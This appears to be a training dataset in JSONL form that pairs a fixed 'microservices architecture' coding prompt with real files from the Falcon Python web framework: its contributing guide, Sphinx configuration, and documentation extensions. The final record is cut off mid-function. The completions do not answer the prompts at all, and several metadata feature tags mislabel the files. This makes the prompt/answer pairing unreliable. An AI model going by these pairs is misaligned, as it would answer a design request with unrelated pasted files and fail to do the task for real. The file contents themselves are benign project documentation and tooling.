{"domain": "system_architecture", "category": "microservices_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate class-based implementation for Design microservices architecture with service communication patterns with containerized deployment\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# Contribute to Falcon\n\nThanks for your interest in the project! We welcome pull requests from\ndevelopers of all skill levels. To get started, simply fork the master branch\non GitHub to your personal account and then clone the fork into your\ndevelopment environment.\n\nIf you would like to contribute but don't already have something in mind,\nwe invite you to take a look at the issues listed under our [next milestone][ms].\nIf you see one you'd like to work on, please leave a quick comment so that we don't\nend up with duplicated effort. Thanks in advance!\n\nThe core Falcon project maintainers are:\n\n* Kurt Griffiths, Project Lead (**kgriffs** on GH, Gitter, and Twitter)\n* John Vrbanac (**jmvrbanac** on GH, Gitter, and Twitter)\n* Vytautas Liuolia (**vytas7** on GH and Gitter, and **vliuolia** on Twitter)\n* Nick Zaccardi (**nZac** on GH and Gitter)\n* Federico Caselli (**CaselIT** on GH and Gitter)\n\nPlease don't hesitate to reach out if you have any questions, or just need a\nlittle help getting started. You can find us in\n[falconry/dev][gitter] on Gitter.\n\nPlease note that all contributors and maintainers of this project are subject to our [Code of Conduct][coc].\n\n## Pull Requests\n\nBefore submitting a pull request, please ensure you have added or updated tests as appropriate,\nand that all existing tests still pass with your changes.\nPlease also ensure that your coding style follows PEP 8 and the ``ruff`` formatting style.\n\nIn order to reformat your code with ``ruff``, simply issue:\n\n```bash\n$ pip install -U ruff\n$ ruff format\n```\n\nYou can also reformat your code, and apply safe ``ruff`` fixes, via the\n``reformat`` ``tox`` environment:\n\n```bash\n$ pip install -U tox\n$ tox -e reformat\n```\n\nYou can check all this by running ``tox`` from within the Falcon project directory.\nYour environment must be based on CPython 3.10, 3.11, 3.12, 3.13, or 3.14:\n\n```bash\n$ pip install -U tox\n$ tox --recreate\n```\n\n### Reviews\n\nFalcon is used in a number of mission-critical applications and is known for its stability and reliability. Therefore, we invest a lot of time in carefully reviewing PRs and working with contributors to ensure that every patch merged into the master branch is correct, complete, performant, well-documented, and appropriate.\n\nProject maintainers review each PR for the following:\n\n- [ ] **Design.** Does it do the right thing? Is the end goal well understood and correct?\n- [ ] **Correctness.** Is the logic correct? Does it behave correctly according to the goal of the feature or bug fix?\n- [ ] **Fit.** Is this feature or fix in keeping with the spirit of the project? Would this idea be better implemented as an add-on?\n- [ ] **Standards.** Does this change align with approved or standards-track RFCs, de-facto standards, and currently accepted best practices?\n- [ ] **Tests.** Does the PR implement sufficient test coverage in terms of value inputs, Python versions, and lines tested?\n- [ ] **Compatibility.** Does it work across all of Falcon's supported Python versions and operating systems?\n- [ ] **Performance.** Will this degrade performance for request or response handling? Are there opportunities to optimize the implementation?\n- [ ] **Docs.** Does this impact any existing documentation or require new documentation? If so, does this PR include the aforementioned docs, and is the language friendly, clear, helpful, and grammatically correct with no misspellings? Do all docstrings conform to Google style ala [sphinx.ext.napoleon](https://sphinxcontrib-napoleon.readthedocs.io/en/latest/index.html)?\n- [ ] **Dependencies.** Does this PR bring in any unnecessary dependencies that would prevent us from keeping the framework lean and mean, jeopardize the reliability of the project, or significantly increase Falcon's attack service?\n- [ ] **Changelog.** Does the PR have a changelog entry in newsfragments? Is the\ntype correct? Try running `towncrier --draft` to ensure it renders correctly.\n\n## Test coverage\n\nPull requests must maintain 100% test coverage of all code branches. This helps ensure the quality of the Falcon framework. To check coverage before submitting a pull request:\n\n```bash\n$ tox\n```\n\nIt is necessary to combine test coverage from multiple environments in order to account for branches in the code that are only taken for a given Python version.\n\nRunning the default sequence of ``tox`` environments generates an HTML coverage report that can be viewed by simply opening `.coverage_html/index.html` in a browser. This can be helpful in tracking down specific lines or branches that are missing coverage.\n\n## Debugging\n\nWe use pytest to run all of our tests. Pytest supports pdb and will break as expected on any\n`pdb.set_trace()` calls. If you would like to use pdb++ instead of the standard Python\ndebugger, simply run the following tox environment. This environment also disables\ncoverage checking to speed up the test run, making it ideal for quick sanity checks.\n\n```bash\n$ tox -e py3_debug\n```\n\nIf you wish, you can customize Falcon's `tox.ini` to install alternative debuggers, such as ipdb or pudb.\n\n## Benchmarking\n\nA few simple benchmarks are included with the source under ``falcon/bench``. These can be taken as a rough measure of the performance impact (if any) that your changes have on the framework. You can run these tests by invoking one of the tox environments included for this purpose (see also the ``tox.ini`` file). For example:\n\n```bash\n$ tox -e py310_bench\n```\n\nNote that you may pass additional arguments via tox to the falcon-bench command:\n\n```bash\n$ tox -e py310_bench -- -h\n$ tox -e py310_bench -- -b falcon -i 20000\n```\n\nAlternatively, you may run falcon-bench directly by creating a new virtual environment and installing falcon directly in development mode. In this example we use pyenv with pyenv-virtualenv from within a falcon source directory:\n\n```bash\n$ pyenv virtualenv 3.10.6 falcon-sandbox-310\n$ pyenv shell falcon-sandbox-310\n$ pip install -r requirements/bench\n$ pip install -e .\n$ falcon-bench\n```\n\nNote that benchmark results for the same code will vary between runs based on a number of factors, including overall system load and CPU scheduling. These factors may be somewhat mitigated by running the benchmarks on a Linux server dedicated to this purpose, and pinning the benchmark process to a specific CPU core.\n\n## Documentation\n\nTo check documentation changes (including docstrings), before submitting a PR, ensure the tox job builds the documentation correctly:\n\n```bash\n$ tox -e docs\n\n# OS X\n$ open docs/_build/html/index.html\n\n# Gnome\n$ gnome-open docs/_build/html/index.html\n\n# Generic X Windows\n$ xdg-open docs/_build/html/index.html\n```\n\n## Recipes and code snippets\n\nIf you are adding new recipes (in `docs/user/recipes`), try to break out code\nsnippets into separate files inside `examples/recipes`.\nThis allows `ruff` to format these snippets to conform to our code style, as\nwell as check for trivial errors.\nThen simply use `literalinclude` to embed these snippets into your `.rst` recipe.\n\nIf possible, try to implement tests for your recipe in `tests/test_recipes.py`.\nThis helps to ensure that our recipes stay up-to-date as the framework's development progresses!\n\n## VS Code Dev Container development environment\n\nWhen opening the project using the [VS Code](https://code.visualstudio.com/) IDE, if you have [Docker](https://www.docker.com/) (or some drop-in replacement such as [Podman](https://podman.io/) or [Colima](https://github.com/abiosoft/colima) or [Rancher Desktop](https://rancherdesktop.io/)) installed, you can leverage the [Dev Containers](https://code.visualstudio.com/docs/devcontainers/containers) feature to start a container in the background with all the dependencies required to test and debug the Falcon code. VS Code integrates with the Dev Container seamlessly, which can be configured via [devcontainer.json][devcontainer]. Once you open the project in VS Code, you can execute the \"Reopen in Container\" command to start the Dev Container which will run the headless VS Code Server process that the local VS Code app will connect to via a [published port](https://docs.docker.com/config/containers/container-networking/#published-ports).\n\n## Code style rules\n\n* Docstrings are required for classes, attributes, methods, and functions. Follow the\n following guidelines for docstrings:\n   * Docstrings should utilize the [napoleon style][docstrings] in order to make them read well, regardless of whether they are viewed through `help()` or on [Read the Docs][rtd].\n   * Docstrings should begin with a short (~70 characters or less) summary line that ends in a period.\n       * The summary line should begin immediately after the opening quotes (do not add\n    a line break before the summary line)\n       * The summary line should describe what it is if it is a class (e.g., \"An\n    asynchronous, file-like object for reading ASGI streams.\")\n       * The summary line should describe what it does when called, if it is a\n     function, structured as an imperative (e.g., \"Delete a header that was previously set for this response.\")\n   * Please try to be consistent with the way existing docstrings are formatted. In particular, note the use of single vs. double backticks as follows:\n    * Double backticks\n        * Inline code\n        * Variables\n        * Types\n        * Decorators\n    * Single backticks\n        * Methods\n        * Params\n        * Attributes\n* Format non-trivial comments using your GitHub nick and one of these prefixes:\n    * TODO(riker): Damage report!\n    * NOTE(riker): Well, that's certainly good to know.\n    * PERF(riker): Travel time to the nearest starbase?\n    * APPSEC(riker): In all trust, there is the possibility for betrayal.\n* When catching exceptions, name the variable `ex`.\n* Use whitespace to separate logical blocks of code and to improve readability.\n* No single-character variable names except for trivial indexes when looping,\nor in mathematical expressions implementing well-known formulas.\n* Heavily document code that is especially complex and/or clever.\n* When in doubt, optimize for readability.\n\n## Changelog\n\nWe use [towncrier](https://towncrier.readthedocs.io/) to manage the changelog. Each PR that modifies the functionality of Falcon should include a short description in a news fragment file in the `docs/_newsfragments` directory.\n\nThe newsfragment file name should have the format `{issue_number}.{fragment_type}.rst`, where the fragment type is one of `breakingchange`, `newandimproved`, `bugfix`, or `misc`. If your PR closes another issue, then the original issue number should be used for the newsfragment; otherwise, use the PR number itself.\n\n## Commit Message Format\n\nFalcon's commit message format uses [AngularJS's style guide][ajs], reproduced here for convenience, with some minor edits for clarity.\n\nEach commit message consists of a **header**, a **body** and a **footer**. The header has a special format that includes a **type**, a **scope** and a **subject**:\n\n```\n<type>(<scope>): <subject>\n<BLANK LINE>\n<body>\n<BLANK LINE>\n<footer>\n```\n\nNo line may exceed 100 characters. This makes it easier to read the message on GitHub as well as in various git tools.\n\n###  Type\nMust be one of the following:\n\n* **feat**: A new feature\n* **fix**: A bug fix\n* **docs**: Documentation only changes\n* **style**: Changes that do not affect the meaning of the code (white-space, formatting, missing semi-colons, etc)\n* **refactor**: A code change that neither fixes a bug or adds a feature\n* **perf**: A code change that improves performance\n* **test**: Adding missing tests\n* **chore**: Changes to the build process or auxiliary tools and libraries such as documentation generation\n\n### Scope\nThe scope could be anything specifying place of the commit change. For example: `$location`, `$browser`, `$compile`, `$rootScope`, `ngHref`, `ngClick`, `ngView`, etc...\n\n### Subject\nThe subject contains succinct description of the change:\n\n* use the imperative, present tense: \"change\" not \"changed\" nor \"changes\"\n* don't capitalize first letter\n* no dot (.) at the end\n\n### Body\nJust as in the **subject**, use the imperative, present tense: \"change\" not \"changed\" nor \"changes\". The body should include the motivation for the change and contrast this with previous behavior.\n\n### Footer\nThe footer should contain any information about **Breaking Changes** and is also the place to reference GitHub issues that this commit **Closes**.\n\n[ajs]: https://github.com/angular/angular.js/blob/master/DEVELOPERS.md#-git-commit-guidelines\n[devcontainer]: https://github.com/falconry/falcon/blob/master/.devcontainer/devcontainer.json\n[docstrings]: https://sphinxcontrib-napoleon.readthedocs.io/en/latest/example_google.html#example-google-style-python-docstrings\n[goog-style]: http://google-styleguide.googlecode.com/svn/trunk/pyguide.html#Comments\n[rtd]: https://falcon.readthedocs.io\n[coc]: https://github.com/falconry/falcon/blob/master/CODEOFCONDUCT.md\n[freenode]: https://www.freenode.net/\n[gitter]: https://gitter.im/falconry/dev\n[ml-join]: mailto:users-join@mail.falconframework.org?subject=join\n[ml-archive]: https://mail.falconframework.org/archives/list/users@mail.falconframework.org/\n[ms]: https://github.com/falconry/falcon/milestones\n", "metadata": {"source": "github.com/falconry/falcon", "file_path": "CONTRIBUTING.md", "language": "markdown", "complexity": "complex", "star_count": 9692, "quality_score": 0.82, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": false, "has_containers": true, "has_diagrams": false, "line_count": 253}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "microservices_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate class-based implementation for Design microservices architecture with service communication patterns for distributed system requirements\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# Copyright 2014-2025 by Falcon Contributors.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#    http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\n# Configuration file for the Sphinx documentation builder.\n#\n# For the full list of built-in configuration values, see the documentation:\n# https://www.sphinx-doc.org/en/master/usage/configuration.html\n\nimport datetime\nimport multiprocessing\nimport os\nimport sys\n\ntry:\n    import falconry_pygments_theme\nexcept ImportError:\n    # NOTE(vytas): If one is packaging Falcon documentation, it might be\n    #   impractical to spend time and effort on our Pygments styles.\n    falconry_pygments_theme = None\n\nsys.path.insert(0, os.path.abspath('..'))\n\nimport falcon  # noqa: E402\n\n# -- Build tweaks -------------------------------------------------------------\n\n# NOTE(kgriffs): Work around the change in Python 3.8 that breaks sphinx\n#   on macOS. See also:\n#\n#   * https://github.com/sphinx-doc/sphinx/issues/6803\n#   * https://docs.python.org/3/library/multiprocessing.html#contexts-and-start-methods\n#\nif not sys.platform.startswith('win'):\n    multiprocessing.set_start_method('fork')\n\n# _on_rtd is whether we are on readthedocs.org\n# _on_rtd = os.environ.get('READTHEDOCS', None) == 'True'\n\n# Used to alter sphinx configuration for the Dash documentation build\n_dash_build = os.environ.get('DASHBUILD', False) == 'True'\n\n# If extensions (or modules to document with autodoc) are in another directory,\n# add these directories to sys.path here. If the directory is relative to the\n# documentation root, use os.path.abspath to make it absolute, like shown here.\nsys.path.insert(0, os.path.abspath('..'))\nsys.path.insert(0, os.path.abspath('.'))\n\n# -- Project information ------------------------------------------------------\n# https://www.sphinx-doc.org/en/master/usage/configuration.html#project-information\n\n_version_components = falcon.__version__.split('.')\n_prerelease_version = any(\n    not component.isdigit() and not component.startswith('post')\n    for component in _version_components\n)\n\n\nproject = 'Falcon'\ncopyright = '{year} Falcon Contributors'.format(year=datetime.datetime.now().year)\nauthor = 'Kurt Griffiths et al.'\nversion = '.'.join(_version_components[0:2])\nrelease = falcon.__version__\n\n# -- General configuration ----------------------------------------------------\n# https://www.sphinx-doc.org/en/master/usage/configuration.html#general-configuration\n\nextensions = [\n    'sphinx.ext.autodoc',\n    'sphinx.ext.intersphinx',\n    'sphinx.ext.napoleon',\n    'sphinx.ext.viewcode',\n    'sphinx_copybutton',\n    'sphinx_design',\n    'myst_parser',\n    # Falcon-specific extensions\n    'ext.autodoc_customizations',\n    'ext.cibuildwheel',\n    'ext.doorway',\n    'ext.falcon_releases',\n    'ext.private_args',\n    'ext.rfc',\n    'ext.workarounds',\n]\n\ntemplates_path = ['_templates']\nexclude_patterns = ['_build', '_newsfragments']\n\n# The name of the Pygments (syntax highlighting) style to use.\n# NOTE(vytas): The PyData theme uses separate Pygments style settings for HTML,\n#   so we specify a print-friendly theme here for the likes of latexpdf.\npygments_style = 'bw'\n\n# myst configuration\nmyst_enable_extensions = ['tasklist']\nmyst_enable_checkboxes = True\n\n# Intersphinx configuration\nintersphinx_mapping = {'python': ('https://docs.python.org/3', None)}\n\n# NOTE(vytas): The autodoc_type_aliases mapping below doesn't really work as\n#   advertised...\n#   Sphinx is looking for the mapped types defined as classes, however, typing\n#   aliases constructed with the help of the | operator (or Union meta type),\n#   etc, are recognized as module data/attributes, not types.\n# TODO(vytas): When defining a class alias manually, it seems to work as\n#   expected, e.g.,\n#\n#   .. class:: PreparedMiddlewareResult\n#\n#       An alias for the return type of prepare_middleware().\n#\n#   See also https://github.com/sphinx-doc/sphinx/issues/10785 & related issues\n#   for discussion and potentially better workarounds.\n# TODO(vytas): If we enable the \"nitpicky\" mode, we will have to add exceptions\n#   for all unresolved aliases.\nautodoc_type_aliases = {\n    'SyncMiddleware': 'SyncMiddleware',\n    'AsyncMiddleware': 'AsyncMiddleware',\n    'PreparedMiddlewareResult': 'PreparedMiddlewareResult',\n}\n\n# -- Options for HTML output --------------------------------------------------\n# https://www.sphinx-doc.org/en/master/usage/configuration.html#options-for-html-output\n\nhtml_css_files = ['custom.css']\nhtml_js_files = ['custom-icons.js']\nhtml_favicon = '_static/img/favicon.ico'\nhtml_logo = '_static/img/logo.svg'\nhtml_static_path = ['_static']\nhtml_theme = 'pydata_sphinx_theme'\nhtml_show_sourcelink = False\n\nhtml_context = {\n    # NOTE(vytas): We don't provide any default, the browser's preference\n    # should be used.\n    # 'default_mode': 'light',\n    'prerelease': _prerelease_version,  # True if tag is not the empty string\n}\n\n# Theme options are theme-specific and customize the look and feel further.\n# https://pydata-sphinx-theme.readthedocs.io/en/stable/user_guide/index.html\n\n_falconry_styles = falconry_pygments_theme is not None\n\nhtml_theme_options = {\n    # NOTE(vytas): If our Pygments styles are unavailable, fall back to the\n    #   visually closest Gruvbox styles.\n    #   NB that Gruvbox does not meet the WCAG 2.1 AA requirements for contrast.\n    'pygments_light_style': 'falconry-light' if _falconry_styles else 'gruvbox-light',\n    'pygments_dark_style': 'falconry-dark' if _falconry_styles else 'gruvbox-dark',\n    'header_links_before_dropdown': 4,\n    'external_links': [\n        {\n            'name': 'Get Help',\n            'url': 'https://falcon.readthedocs.io/community/help.html',\n        },\n        {'name': 'Falcon Wiki', 'url': 'https://github.com/falconry/falcon/wiki'},\n        {\n            'name': 'Support Falcon',\n            'url': 'https://falconframework.org/#sectionSupportFalconDevelopment',\n        },\n    ],\n    'icon_links': [\n        {\n            'name': 'GitHub',\n            'url': 'https://github.com/falconry/falcon',\n            'icon': 'fa-brands fa-github',\n        },\n        {\n            'name': 'PyPI',\n            'url': 'https://pypi.org/project/falcon',\n            'icon': 'fa-custom fa-pypi',\n        },\n        {\n            'name': 'Falcon Home',\n            'url': 'https://falconframework.org',\n            'icon': 'fa-custom fa-falcon',\n        },\n    ],\n    'logo': {\n        'text': 'Falcon',\n    },\n    'navbar_end': ['theme-switcher', 'navbar-icon-links'],\n    'footer_start': ['copyright'],\n    'footer_end': ['theme-version'],\n}\n\nif _dash_build:\n    html_theme_options.update(font_size=13)\n\n\n# -- Options for LaTeX output -------------------------------------------------\n\n# NOTE(vytas): The default engine fails to build citing unsupported Unicode\n# characters.\nlatex_engine = 'xelatex'\n\nlatex_elements = {\n    'papersize': 'a4paper',\n    # The font size ('10pt', '11pt' or '12pt').\n    # 'pointsize': '10pt',\n    # Additional stuff for the LaTeX preamble.\n    # 'preamble': '',\n}\n\nlatex_documents = [\n    (\n        'index',\n        'Falcon.tex',\n        'Falcon Documentation',\n        'Kurt Griffiths et al.',\n        'manual',\n    ),\n]\n\n# -- Options for manual page output -------------------------------------------\n\nman_pages = [('index', 'falcon', 'Falcon Documentation', ['Kurt Griffiths et al.'], 1)]\n\n# -- Options for Texinfo output -----------------------------------------------\n\ntexinfo_documents = [\n    (\n        'index',\n        'Falcon',\n        'Falcon Documentation',\n        'Kurt Griffiths et al.',\n        'Falcon',\n        'One line description of project.',\n        'Miscellaneous',\n    ),\n]\n", "metadata": {"source": "github.com/falconry/falcon", "file_path": "docs/conf.py", "language": "python", "complexity": "complex", "star_count": 9692, "quality_score": 0.85, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": true, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 244}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "microservices_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate class-based implementation for Design microservices architecture with service communication patterns for distributed system requirements\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# Copyright 2024-2025 by Vytautas Liuolia.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#    http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\n\"\"\"\nBinary wheels table extension for Sphinx.\n\nThis extension parses a GitHub Actions workflow for building binary wheels, and\nsummarizes the build onfiguration in a stylish table.\n\"\"\"\n\nimport itertools\nimport pathlib\n\nimport sphinx.util.docutils\nimport yaml\n\nFALCON_ROOT = pathlib.Path(__file__).resolve().parent.parent.parent\nDOT_GITHUB = FALCON_ROOT / '.github'\n\n_CHECKBOX = '\\u2705'\n_CPYTHON_PLATFORMS = {\n    'manylinux_x86_64': '**Linux Intel** ``manylinux`` 64-bit',\n    'musllinux_x86_64': '**Linux Intel** ``musllinux`` 64-bit',\n    'manylinux_i686': '**Linux Intel** ``manylinux`` 32-bit',\n    'musllinux_i686': '**Linux Intel** ``musllinux`` 32-bit',\n    'manylinux_aarch64': '**Linux ARM** ``manylinux`` 64-bit',\n    'musllinux_aarch64': '**Linux ARM** ``musllinux`` 64-bit',\n    'manylinux_ppc64le': '**Linux PowerPC** ``manylinux`` 64-bit',\n    'musllinux_ppc64le': '**Linux PowerPC** ``musllinux`` 64-bit',\n    'manylinux_s390x': '**Linux IBM Z** ``manylinux``',\n    'musllinux_s390x': '**Linux IBM Z** ``musllinux``',\n    'macosx_x86_64': '**macOS Intel**',\n    'macosx_arm64': '**macOS Apple Silicon**',\n    'win32': '**Windows** 32-bit',\n    'win_amd64': '**Windows** 64-bit',\n    'win_arm64': '**Windows ARM** 64-bit',\n}\n\n_EXTEND_CPYTHONS = frozenset({'cp38', 'cp39'})\n\n\nclass WheelsDirective(sphinx.util.docutils.SphinxDirective):\n    \"\"\"Directive to tabulate build info from a YAML workflow.\"\"\"\n\n    required_arguments = 1\n    has_content = True\n\n    @classmethod\n    def _emit_table(cls, data):\n        columns = len(data[0])\n        assert all(len(row) == columns for row in data), (\n            'All rows must have the same number of columns'\n        )\n        # NOTE(vytas): +2 is padding inside cell borders.\n        width = max(len(cell) for cell in itertools.chain(*data)) + 2\n        hline = ('+' + '-' * width) * columns + '+\\n'\n        output = [hline]\n\n        for row in data:\n            for cell in row:\n                # NOTE(vytas): Emojis take two spaces...\n                padded_width = width - 1 if cell == _CHECKBOX else width\n                output.append('|' + cell.center(padded_width))\n            output.append('|\\n')\n\n            header_line = row == data[0]\n            output.append(hline.replace('-', '=') if header_line else hline)\n\n        return ''.join(output)\n\n    def run(self):\n        workflow_path = pathlib.Path(self.arguments[0])\n        if not workflow_path.is_absolute():\n            workflow_path = FALCON_ROOT / workflow_path\n\n        # TODO(vytas): Should we package cibuildwheel.yaml into sdist too?\n        #   For now, if .github is missing, we simply hide the table.\n        if not workflow_path.is_file() and not DOT_GITHUB.exists():\n            return []\n\n        with open(workflow_path) as fp:\n            workflow = yaml.safe_load(fp)\n\n        matrix = workflow['jobs']['build-wheels']['strategy']['matrix']\n        platforms = matrix['platform']\n        include = matrix.get('include', [])\n        assert not matrix.get('exclude'), 'TODO: exclude is not supported yet'\n        supported = set(\n            itertools.product(\n                [platform['name'] for platform in platforms], matrix['python']\n            )\n        )\n        supported.update((item['platform']['name'], item['python']) for item in include)\n        cpythons = sorted(\n            {cp for _, cp in supported} | _EXTEND_CPYTHONS,\n            key=lambda val: (len(val), val),\n        )\n\n        header = ['Platform / CPython version']\n        table = [header + [cp.replace('cp3', '3.') for cp in cpythons]]\n        table.extend(\n            [description]\n            + [(_CHECKBOX if (name, cp) in supported else '') for cp in cpythons]\n            for name, description in _CPYTHON_PLATFORMS.items()\n        )\n\n        content = '\\n'.join(self.content) + '\\n\\n' + self._emit_table(table)\n        return self.parse_text_to_nodes(content)\n\n\ndef setup(app):\n    app.add_directive('wheels', WheelsDirective)\n\n    return {\n        'version': '0.1',\n        'parallel_read_safe': True,\n        'parallel_write_safe': True,\n    }\n", "metadata": {"source": "github.com/falconry/falcon", "file_path": "docs/ext/cibuildwheel.py", "language": "python", "complexity": "medium", "star_count": 9692, "quality_score": 0.8799999999999999, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 130}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "microservices_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate function-based implementation for Design microservices architecture with service communication patterns for distributed system requirements\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# Copyright 2016 by Rackspace Hosting, Inc.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#    http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\n\"\"\"Doorway module extension for Sphinx.\n\nThis extension modifies the way the top-level \"falcon\" doorway module\nis documented.\n\"\"\"\n\n\ndef _on_process_docstring(app, what, name, obj, options, lines):\n    \"\"\"Process the docstring for a given python object.\"\"\"\n\n    # NOTE(kgriffs): Suppress the top-level docstring since it is\n    #   typically used with autodoc on rst pages that already have their\n    #   own introductory texts, tailored to a specific subset of\n    #   things that have been hoisted into the 'falcon' doorway module.\n    if what == 'module' and name == 'falcon':\n        lines[:] = []\n\n\ndef setup(app):\n    app.connect('autodoc-process-docstring', _on_process_docstring)\n\n    return {'parallel_read_safe': True}\n", "metadata": {"source": "github.com/falconry/falcon", "file_path": "docs/ext/doorway.py", "language": "python", "complexity": "simple", "star_count": 9692, "quality_score": 0.76, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 37}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "microservices_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate class-based implementation for Design microservices architecture with service communication patterns for distributed system requirements\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# Copyright 2025 by Vytautas Liuolia.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#    http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\n\"\"\"\nInformation on stable Falcon releases.\n\nThis extension aggregates a table of maintained and EOL Falcon releases from\nthe provided path containing changelogs.\n\"\"\"\n\nimport collections\nimport datetime\nimport enum\nimport itertools\nimport pathlib\nimport re\n\nimport sphinx.util.docutils\n\nFALCON_DOCS_ROOT = pathlib.Path(__file__).resolve().parent.parent\n\n\nclass _FalconRelease:\n    \"\"\"A stable Falcon release.\"\"\"\n\n    _CHANGELOG_PATTERN = re.compile(r'^(\\d+)\\.(\\d+).(\\d+)\\.rst$')\n    _RELEASE_META_PATTERN = re.compile(r'\\.\\.\\s+falcon-release\\:\\s+([\\d-]+)')\n\n    _PYPI_API_URL = 'https://pypi.org/pypi/falcon/{version}/json'\n\n    @classmethod\n    def from_changelog(cls, path):\n        if not (mt := cls._CHANGELOG_PATTERN.match(path.name)):\n            return None\n\n        version = tuple(map(int, mt.groups()))\n        if mt := cls._RELEASE_META_PATTERN.search(path.read_text()):\n            date = datetime.date.fromisoformat(mt.group(1))\n        else:\n            date = None\n\n        return cls(version, date)\n\n    @classmethod\n    def gather(cls, changelog_path):\n        releases = [cls.from_changelog(path) for path in changelog_path.iterdir()]\n        return sorted(\n            release\n            for release in releases\n            if release is not None and not release.is_zerover\n        )\n\n    @property\n    def is_zerover(self):\n        return self.major == 0\n\n    @property\n    def major(self):\n        return self.version[0]\n\n    @property\n    def version_str(self):\n        return '.'.join(map(str, self.version))\n\n    @property\n    def version_major_minor(self):\n        return '.'.join(map(str, self.version[:2]))\n\n    def __init__(self, version, date=None):\n        self.version = version\n        self.date = date\n\n    @property\n    def doc_link(self):\n        return f':doc:`{self.version_str} </changes/{self.version_str}>`'\n\n    @property\n    def doc_link_major_minor(self):\n        return f':doc:`{self.version_major_minor} </changes/{self.version_str}>`'\n\n    @property\n    def rst_repr(self):\n        return f'{self.doc_link} ({self.date})'\n\n    def __eq__(self, other):\n        return self.version == other.version\n\n    def __lt__(self, other):\n        return self.version < other.version\n\n    def __repr__(self):\n        return f'<falcon-{self.version_str} {self.date}>'\n\n    def _load_date_from_pypi(self):\n        # NOTE(vytas): This is not really used, but it is handy to verify the\n        #   dates of historical releases, and other types of debugging.\n        import requests\n\n        resp = requests.get(self._PYPI_API_URL.format(version=self.version_str))\n        if resp.status_code == 200:\n            artifact, *_ = resp.json()['urls']\n            upload_date, _, _ = artifact['upload_time'].partition('T')\n            self.date = datetime.date.fromisoformat(upload_date)\n        return self.date\n\n\n_FalconMajorMinor = collections.namedtuple('_FalconMajorMinor', ('first', 'latest'))\n\n\nclass _ReleaseStatus(enum.Enum):\n    current = 'current'\n    security = 'security'\n    eol = 'eol'\n\n    @property\n    def ref(self):\n        return f':ref:`stable_release_{self.value}`'\n\n\nclass FalconReleasesDirective(sphinx.util.docutils.SphinxDirective):\n    \"\"\"Directive to tabulate the summary of stable Falcon releases.\"\"\"\n\n    _OLDSTABLE_MAINTENANCE_PERIOD = datetime.timedelta(days=365 * 2)\n\n    required_arguments = 1\n    has_content = True\n\n    def run(self):\n        changelog_path = pathlib.Path(self.arguments[0])\n        if not changelog_path.is_absolute():\n            changelog_path = FALCON_DOCS_ROOT / changelog_path\n\n        releases = _FalconRelease.gather(changelog_path)\n        for release in releases[:-1]:\n            assert release.date is not None, (\n                f'{release} has no release date metadata (and is not latest)'\n            )\n        if releases[-1].date is None:\n            releases.pop()\n\n        stable_releases = []\n        for _, group in itertools.groupby(\n            reversed(releases), lambda rel: rel.version_major_minor\n        ):\n            series = list(group)\n            